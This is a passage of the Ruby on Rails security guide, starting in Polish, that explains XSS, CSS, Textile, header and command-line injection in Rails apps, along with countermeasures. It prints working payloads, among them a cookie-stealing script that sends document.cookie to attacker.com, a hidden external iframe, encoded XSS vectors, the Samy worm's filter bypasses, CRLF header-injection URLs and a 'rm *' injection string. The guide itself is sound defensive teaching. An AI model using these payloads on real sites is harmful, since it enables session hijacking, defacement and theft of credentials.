W drugiej połowie 2007 r. było 88 zgłoszonych usterek w Mozilli, 22 w Safari, 18 w IE, a 12 w Operze. W http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf[sprawozdaniu Symantec Internet Security Globalne] także udokumentowano 239 usterek we wtyczkach do przeglądarek w ciągu ostatnich sześciu miesięcy 2007 roku. http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx [MPack] jest bardzo aktywnym i aktualnym frameworkiem ataku , który wykorzystuje te luki. Dla hakerów, wizja wykorzystania luk podatnych na ataki typu SQL Injection we frameworkach aplikacji internetowych i wprowadzenie złośliwego kodu w każdej kolumnie tabel tekstowych jest bardzo kuszące. W kwietniu 2008 ponad 510.000 stron http://www.0x000000.com/?i=556 [były zhakowane] jak tak. Wśród nich znalazły się strony brytyjskiego rządu, ONZ i wiele innych poważnych celów. 
 
Stosunkowo nowymi i niecodziennymi formami punktów wejścia są banery reklamowe. We wcześniejszych miesiącach 2008 roku, złośliwy kod ukazał się w reklamach w formie baneru na popularnych witrynach, takich jak MySpace i Excite, zgodnie z http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/[Trend Micro]. 

==== HTML/JavaScript Injection

The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. [,#fffcdb]#Escaping user input is essential#.

Here is the most straightforward test to check for XSS:

..........
<script>alert('Hello');</script>
..........

This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:

..........
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
..........

===== Cookie theft

These examples don't do any harm so far, so let's see how an attacker can steal the user's cookie (and thus hijack the user's session). In JavaScript you can use the document.cookie property to read and write the document's cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:

..........
<script>document.write(document.cookie);</script>
..........

For an attacker, of course, this is not useful, as the victim will see his own cookie. The next example will try to load an image from the URL http://www.attacker.com/ plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review his web server's access log files to see the victims cookie.

..........
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
..........

The log files on www.attacker.com will read like this:

..........
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
..........

You can mitigate these attacks (in the obvious way) by adding the http://dev.rubyonrails.org/ticket/8895[httpOnly] flag to cookies, so that document.cookie may not be read by JavaScript. Http only cookies can be used from IE v6.SP1, Firefox v2.0.0.5 and Opera 9.5. Safari is still considering, it ignores the option. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/[will still be visible using Ajax], though.

===== Defacement

With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:

..........
<iframe name=”StatPage” src="http://58.xx.xxx.xxx" width=5 height=5 style=”display:none”></iframe>
..........

This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iFrame is taken from an http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html[actual attack] on legitimate Italian sites using the http://isc.sans.org/diary.html?storyid=3015[Mpack attack framework]. Mpack tries to install malicious software through security holes in the web browser – very successfully, 50% of the attacks succeed.

A more specialized attack could overlap the entire web site or display a login form, which looks the same as the site's original, but transmits the user name and password to the attackers site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.

Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that "George Bush appointed a 9 year old boy to be the chairperson...":

..........
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
..........

===== Countermeasures

[,#fffcdb]#It is very important to filter malicious input, but it is also important to escape the output of the web application#.

Especially for XSS, it is important to do [,#fffcdb]#whitelist input filtering instead of blacklist#. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.

Imagine a blacklist deletes “script” from the user input. Now the attacker injects “<scrscriptipt>”, and after the filter, “<script>” remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:

...........
strip_tags("some<<b>script>alert('hello')<</b>/script>") 
...........

This returned "some<script>alert('hello')</script>", which makes an attack work. That's why I vote for a whitelist approach, using the updated Rails 2 method sanitize():

...........
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, :tags => tags, :attributes => %w(href title))
...........

This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

As a second step, [,#fffcdb]#it is good practice to escape all output of the application#, especially when re-displaying user input, which hasn't been input filtered (as in the search form example earlier on). [,#fffcdb]#Use escapeHTML() (or its alias h()) method# to replace the HTML input characters &,",<,> by its uninterpreted representations in HTML (&amp;, &quot;, &lt; and &gt;). However, it can easily happen that the programmer forgets to use it, so [,#fffcdb]#it is recommended to use the http://safe-erb.rubyforge.org/svn/plugins/safe_erb/[SafeErb] plugin#. SafeErb reminds you to escape strings from external sources.

===== Obfuscation and Encoding Injection

Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

............
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
............

This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus “get to know your enemy”, is the http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php[Hackvertor]. Rails‘ sanitize() method does a good job to fend off encoding attacks.

==== Examples from the underground

-- _In order to understand today's attacks on web applications, it's best to take a look at some real-world attack vectors._

The following is an excerpt from the http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1[Js.Yamanner@m] Yahoo! Mail http://groovin.net/stuff/yammer.txt[worm]. It appeared on June 11, 2006 and was the first webmail interface worm:

...........
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif' 
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
...........

The worms exploits a hole in Yahoo's HTML/JavaScript filter, it usually filters all target and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details and a video demonstration on http://rosario.valotta.googlepages.com/home[Rosario Valotta's website]. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual user names and passwords were stolen in a http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html[MySpace phishing attack]. The idea of the attack was to create a profile page named “login_home_index_html”, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

The MySpace Samy worm will be discussed in the CSS Injection section.

=== CSS Injection

-- _CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application._

CSS Injection is explained best by a well-known worm, the http://namb.la/popular/tech.html[MySpace Samy worm]. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, but it creates too much traffic on MySpace, so that the site goes offline. The following is a technical explanation of the worm.

MySpace blocks many tags, however it allows CSS. So the worm's author put JavaScript into CSS like this:

...........
<div style="background:url('javascript:alert(1)')">
...........

So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript allows has a handy eval() function which executes any string as code.

...........
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')"> 
...........

The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word “innerHTML”:

...........
alert(eval('document.body.inne' + 'rHTML')); 
...........

The next problem was MySpace filtering the word “javascript”, so the author used “java<NEWLINE>script" to get around this:

...........
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
...........

Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a the user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The http://www.securiteam.com/securitynews/5LP051FHPE.html[moz-binding] CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

==== Countermeasures
This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, I am not aware of a whitelist CSS filter. [,#fffcdb]#If you want to allow custom colours or images, you can allow the user to choose them and build the CSS in the web application#. Use Rails' +sanitize()+ method as a model for a whitelist CSS filter, if you really need one.

=== Textile Injection

-- _If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. http://whytheluckystiff.net/ruby/redcloth/[RedCloth] is such a language for Ruby, but without precautions, it is also vulnerable to XSS._

	For example, RedCloth translates _test_ to <em>test<em>, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the http://www.redcloth.org[all-new version 4] that removed serious bugs. However, even that version has http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html[some security bugs], so the countermeasures still apply. Here is an example for version 3.0.4:


...........
>> RedCloth.new('<script>alert(1)</script>').to_html
=> "<script>alert(1)</script>"
...........

Use the :filter_html option to remove HTML which was not created by the Textile processor.

...........
>> RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
=> "alert(1)"
...........

However, this does not filter all HTML, a few tags will be left (by design), for example <a>:

...........
>> RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
=> "<p><a href="javascript:alert(1)">hello</a></p>"
...........

==== Countermeasures

It is recommended to [,#fffcdb]#use RedCloth in combination with a whitelist input filter#, as described in the countermeasures against XSS.

=== Ajax Injection

-- _The same security precautions have to be taken for Ajax actions as for “normal” ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._

If you use the http://dev.rubyonrails.org/browser/plugins/in_place_editing[in_place_editor plugin], or actions that return a string, rather than rendering a view, [,#fffcdb]#you have to escape the return value in the action#. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.

=== RJS Injection

-- _Don't forget to escape in JavaScript (RJS) templates, too._

The RJS API generates blocks of JavaScript code based on Ruby code, thus allowing you to manipulate a view or parts of a view from the server side. [,#fffcdb]#If you allow user input in RJS templates, do escape it using escape_javascript() within JavaScript functions, and in HTML parts using h()#. Otherwise an attacker could execute arbitrary JavaScript.

=== Command Line Injection

-- _Use user-supplied command line parameters with caution._

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and \`command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

A countermeasure is to [,#fffcdb]#use the +system(command, parameters)+ method which passes command line parameters safely#.

..........
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
..........


=== Header Injection
-- _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._

HTTP request headers have a Referer, User-Agent (client software) and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. [,#fffcdb]#Remember to escape these header fields, too.# For example when you display the user agent in an administration area.

Besides that, it is [,#fffcdb]#important to know what you are doing when building response headers partly based on user input.# For example you want to redirect the user back to a specific page. To do that you introduced a “referer“ field in a form to redirect to the given address:

..........
redirect_to params[:referer]
..........

What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

..........
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
..........

And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

..........
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
..........

Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

..........
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
..........

So [,#fffcdb]#attack vectors for Header Injection are based on the injection of CRLF characters in a header field.# And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. [,#fffcdb]#Rails 2.1.2 escapes these characters for the Location field in the redirect_to method. Make sure you do it yourself when you build other header fields with user input.#

==== Response Splitting
If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

..........
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


<html><font color=red>hey</font></html> [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
..........

Under certain circumstances this would present the malicious HTML to the victim. However, this seems to work with Keep-Alive connections, only (and many browsers are using one-time connections). But you can't rely on this. [,#fffcdb]#In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.#


== Additional resources

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

- The Ruby on Rails security project posts security news regularly: http://www.rorsecurity.info[http://www.rorsecurity.info]
- Subscribe to the Rails security http://groups.google.com/group/rubyonrails-security[mailing list]
- http://secunia.com/[Keep up to date on the other application layers] (they have a weekly newsletter, too)
- A http://ha.ckers.org/blog/[good security blog] including the http://ha.ckers.org/xss.html[Cross-Site scripting Cheat Sheet]
- Another http://www.0x000000.com/[good security blog] with some Cheat Sheets, too

== Changelog ==

http://rails.lighthouseapp.com/projects/16213-rails-guides/tickets/7[Lighthouse ticket]

* November 1, 2008: First approved version by Heiko Webers
